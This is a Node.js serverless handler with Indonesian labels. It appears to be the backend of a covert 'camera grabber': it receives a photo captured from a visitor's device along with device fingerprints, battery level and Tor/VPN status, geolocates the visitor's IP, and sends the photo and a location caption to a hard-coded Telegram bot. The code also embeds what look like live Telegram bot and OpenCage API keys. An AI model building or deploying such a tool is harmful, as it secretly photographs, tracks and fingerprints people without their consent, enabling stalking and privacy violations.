import fetch from "node-fetch";
import FormData from "form-data";
import UAParser from "ua-parser-js";

const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda";

const countryNames = {
  ID: "Indonesia",
  US: "United States",
  MY: "Malaysia",
  SG: "Singapore",
  IN: "India",
  // Tambahkan negara lain sesuai kebutuhan
};

export default async function handler(req, res) {
  try {
    const { image, deviceInfo } = req.body;
    const botToken = "7549302119:AAHTx2AbUyZS9fksVLWyjuZAgwPF-gRIVto";
    const chatId = "6676770258";

    // Cek jika gambar valid (base64 format)
    if (!image || !image.startsWith("data:image/")) {
      console.error("Gambar tidak valid");
      return res.status(400).json({ success: false, message: "Gambar tidak valid" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];
    const parser = new UAParser(userAgent);

    const device = parser.getDevice();
    const os = parser.getOS();
    const browser = parser.getBrowser();

    const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
    const ipInfo = await ipInfoRes.json();

    const countryCode = ipInfo.country || "XX";
    const countryName = countryNames[countryCode] || countryCode;

    const lokasi = `${ipInfo.city}, ${ipInfo.region}, ${countryCode}`;
    const isp = ipInfo.org || "Unknown ISP";
    const timezone = ipInfo.timezone || "Asia/Jakarta";
    const waktu = new Date().toLocaleString("id-ID", { timeZone: timezone });

    const [lat, lon] = (ipInfo.loc || "").split(",");
    let provinsiKota = "Tidak tersedia";
    if (lat && lon) {
      const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_KEY}`);
      const geoData = await geoRes.json();
      const components = geoData?.results?.[0]?.components || {};
      const city = components.city || components.town || components.village || "Tidak diketahui";
      const state = components.state || "Tidak diketahui";
      provinsiKota = `${state}, ${city}`;
    }

    const bahasa = req.headers["accept-language"]?.split(",")[0] || "Tidak diketahui";
    const waktuLogin = new Date().toLocaleString("id-ID");
    const ipLokal = req.connection.localAddress || "Tidak diketahui";
    const hostName = req.headers["host"] || "Tidak diketahui";
    const appVersion = req.headers["x-app-version"] || "Tidak diketahui";
    const networkProtocol = req.connection.encrypted ? "HTTPS" : "HTTP";
    const browserExtensions = browser.name ? `${browser.name} Extensions` : "Tidak diketahui";
    const signalStrength = "Kuat";
    const apiVersion = "1.0";
    const gpsStatus = lat && lon ? "Aktif" : "Tidak tersedia";
    const timezoneOffset = new Date().getTimezoneOffset() / -60;

    const deviceMood = deviceInfo.batteryLevel > 75 ? "semangat banget!" : "lemes... colokin dulu dong";
    const darkModeStatus = deviceInfo.isDarkMode ? "Aktif" : "Tidak aktif";
    const privateModeStatus = deviceInfo.isPrivateMode ? "Ya" : "Tidak";
    const screenInfo = `${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (Ratio: ${deviceInfo.pixelRatio})`;
    const uptime = deviceInfo.uptime || "Tidak diketahui";
    const torStatus = deviceInfo.torStatus || "Tidak terdeteksi";
    const vpnStatus = deviceInfo.vpnStatus || "Tidak terdeteksi";
    const tabCount = deviceInfo.tabCount || "Tidak diketahui";
    const canvasFingerprint = deviceInfo.fingerprint?.canvas || "Tidak tersedia";
    const audioFingerprint = deviceInfo.fingerprint?.audio || "Tidak tersedia";
    const gpu = deviceInfo.gpu || "Tidak diketahui";

    const caption = `Dev By @FazrrEdan

🌎 Informasi Pengguna 
-IP: ${ip}
-Negara: ${countryName}
-Lokasi: ${lokasi}
-Provinsi & Kota: ${provinsiKota}
-Bahasa: ${bahasa}
-ISP: ${isp}
-Jam: ${waktu}
-Timezone: ${timezone} (GMT${timezoneOffset >= 0 ? "+" : ""}${timezoneOffset})
-Cuaca Lokal: ${deviceInfo.weather || "Tidak diketahui"}
-Jarak dari Kota Terdekat: ${deviceInfo.cityDistance || "Tidak diketahui"}
`;

    const imageBuffer = Buffer.from(image.split(",")[1], "base64");

    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", imageBuffer, "photo.jpg");
    form.append("caption", caption);

    const telegram = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    const result = await telegram.json();
    console.log(result);
    res.status(200).json({ success: true, result });
  } catch (error) {
    console.error("Gagal kirim ke Telegram:", error);
    res.status(500).json({ success: false });
  }
}
